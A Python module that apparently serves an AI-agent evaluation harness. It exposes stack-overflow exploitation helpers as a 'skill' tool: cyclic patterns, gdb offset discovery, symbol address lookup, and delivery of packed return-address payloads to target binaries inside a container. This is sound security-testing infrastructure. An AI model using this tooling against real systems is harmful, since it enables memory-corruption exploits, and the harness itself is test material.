"""Executable skill compilation: curated exploitation procedures exposed as a
single `skill` tool for container-bound agent runs.

The model supplies intent (which procedure, which binary); these host-side
implementations supply the craft. Logic ported from homework/solve_rung1.py —
that file stays untouched as the solvability-proof artifact.
"""
import re
import struct


# ---- De Bruijn cyclic pattern (pwntools-free) --------------------------------
def cyclic(n: int, subseq: int = 4) -> bytes:
    """De Bruijn sequence over a lowercase alphabet, byte length n."""
    k = 26
    alphabet = [chr(ord('a') + i) for i in range(k)]
    a = [0] * (k * subseq)
    seq = []

    def db(t, p):
        if t > subseq:
            if subseq % p == 0:
                seq.extend(a[1:p + 1])
        else:
            a[t] = a[t - p]
            db(t + 1, p)
            for j in range(a[t - p] + 1, k):
                a[t] = j
                db(t + 1, t)

    db(1, 1)
    return "".join(alphabet[i] for i in seq).encode()[:n]


def cyclic_find(haystack: bytes, needle: bytes) -> int:
    """Offset of a byte fragment (e.g. a little-endian register value), or -1."""
    return haystack.find(needle)


def parse_payload(spec: str) -> bytes:
    """Parse a payload spec like 'A*72 + p64(0x4011d6)' into bytes.

    Terms separated by '+': '<char>*<count>' repeats, 'p32(0xADDR)' / 'p64(0xADDR)'
    little-endian packed addresses (hex or decimal). Raises ValueError on anything
    else so the caller can hand the message back to the agent."""
    out = b""
    for term in spec.split("+"):
        term = term.strip()
        if not term:
            continue
        m = re.fullmatch(r"(.)\s*\*\s*(\d+)", term)
        if m:
            out += m.group(1).encode("latin-1") * int(m.group(2))
            continue
        m = re.fullmatch(r"p(32|64)\(\s*(0x[0-9a-fA-F]+|\d+)\s*\)", term)
        if m:
            fmt = "<I" if m.group(1) == "32" else "<Q"
            out += struct.pack(fmt, int(m.group(2), 0))
            continue
        raise ValueError(f"unparseable term {term!r} (want X*N or p64(0xADDR))")
    if not out:
        raise ValueError("empty payload spec")
    return out


# ---- docker-backed skills -----------------------------------------------------
# Each coroutine: (cexec, args: str) -> str. cexec runs argv inside the bound
# container and returns (exit_code, combined_output). Skills NEVER raise —
# failures come back as diagnostic text the agent can act on.

_FALLBACK_OFFSET = 72  # 64-byte buf + saved rbp at -O0, verified on homework rungs


async def _skill_discover_offset(cexec, args: str) -> str:
    binary = args.split()[0] if args.split() else ""
    if not binary:
        return "usage: skill discover_offset <binary-path>"
    pat = cyclic(256)
    await cexec("bash", "-c", "cat > /tmp/pat.txt", input_bytes=pat)
    code, out = await cexec(
        "gdb", "-q", "-batch",
        "-ex", "run < /tmp/pat.txt",
        "-ex", "info registers rip",
        "-ex", "x/1gx $rsp",
        binary, timeout=120)
    m = re.search(r"rip\s+(0x[0-9a-f]+)", out)
    if m:
        rip = int(m.group(1), 16)
        off = cyclic_find(pat, struct.pack("<Q", rip)[:4])
        if off >= 0:
            return (f"offset to saved return address: {off} "
                    f"(crash rip=0x{rip:x} located in cyclic pattern)")
    # Non-canonical ret: $rip still points at ret; the return slot is at $rsp.
    m = re.search(r"0x[0-9a-f]+:\s+(0x[0-9a-f]+)", out)
    if m:
        slot = int(m.group(1), 16)
        off = cyclic_find(pat, struct.pack("<Q", slot))
        if off >= 0:
            return (f"offset to saved return address: {off} "
                    f"(non-canonical ret; return slot @rsp=0x{slot:x})")
    return ("offset discovery INCONCLUSIVE — gdb output:\n" + out[-800:] +
            f"\nfallback for -O0 layout (64-byte buf + saved rbp): {_FALLBACK_OFFSET}")


async def _skill_find_symbol(cexec, args: str) -> str:
    parts = args.split()
    if len(parts) < 2:
        return "usage: skill find_symbol <binary> <symbol>"
    binary, name = parts[0], parts[1]
    code, out = await cexec("nm", binary)
    m = re.search(rf"^([0-9a-f]+) [Tt] {re.escape(name)}$", out, re.M)
    if not m:
        return (f"symbol '{name}' not found as a text symbol in nm output "
                f"(exit {code}):\n{out[:800]}")
    addr = int(m.group(1), 16)
    _, hdr = await cexec("readelf", "-h", binary)
    type_line = next((l for l in hdr.splitlines() if "Type:" in l), "")
    if "DYN" in type_line:
        return (f"{name} is at file offset 0x{addr:x} — PIE binary: "
                f"runtime address = leaked_base + 0x{addr:x}")
    return f"{name} = 0x{addr:x} (absolute address — non-PIE binary)"


async def _skill_cyclic(cexec, args: str) -> str:
    try:
        n = int(args.split()[0])
    except (IndexError, ValueError):
        return "usage: skill cyclic <length>  (prints a De Bruijn pattern)"
    return cyclic(min(n, 4096)).decode("latin-1")


async def _skill_cyclic_find(cexec, args: str) -> str:
    tok = args.split()[0] if args.split() else ""
    tok = tok[2:] if tok.startswith("0x") else tok
    try:
        needle = bytes.fromhex(tok)
    except ValueError:
        return "usage: skill cyclic_find <hexbytes>  e.g. cyclic_find 0x62616164"
    off = cyclic(4096).find(needle)
    if off < 0:
        return f"{tok} not found in the standard cyclic pattern"
    return f"offset of 0x{tok} in the cyclic pattern: {off}"


async def _skill_deliver_stdin(cexec, args: str) -> str:
    binary, _, spec = args.strip().partition(" ")
    if not binary or not spec.strip():
        return ("usage: skill deliver_stdin <binary> <spec>  "
                "e.g. skill deliver_stdin /target/rung1 A*72 + p64(0x4011d6)")
    try:
        payload = parse_payload(spec)
    except ValueError as e:
        return f"bad payload spec: {e}"
    code, out = await cexec(binary, input_bytes=payload, timeout=30)
    return f"[sent {len(payload)} bytes on stdin, exit {code}]\n{out.rstrip()}"


SKILLS = {
    "discover_offset": ("discover_offset <binary> — crash under gdb on a cyclic "
                        "pattern; returns the exact offset to the saved return address",
                        _skill_discover_offset),
    "find_symbol": ("find_symbol <binary> <name> — nm + PIE check; returns the "
                    "function's absolute address (non-PIE) or file offset (PIE)",
                    _skill_find_symbol),
    "cyclic": ("cyclic <n> — print a De Bruijn pattern of length n (payload padding "
               "whose every 4-byte fragment locates its own offset)",
               _skill_cyclic),
    "cyclic_find": ("cyclic_find <hexbytes> — offset of a byte fragment (e.g. a "
                    "register value) in the standard cyclic pattern",
                    _skill_cyclic_find),
    "deliver_stdin": ("deliver_stdin <binary> <spec> — run the target with a payload "
                      "on stdin; spec e.g. 'A*72 + p64(0x4011d6)'; returns its output",
                      _skill_deliver_stdin),
}


def skill_docs() -> str:
    return "\n".join(f"          {doc}" for doc, _ in SKILLS.values())


async def run_skill(name: str, args: str, cexec) -> str:
    entry = SKILLS.get(name)
    if entry is None:
        return ("unknown skill '%s'; available:\n" % name) + skill_docs()
    return await entry[1](cexec, args)
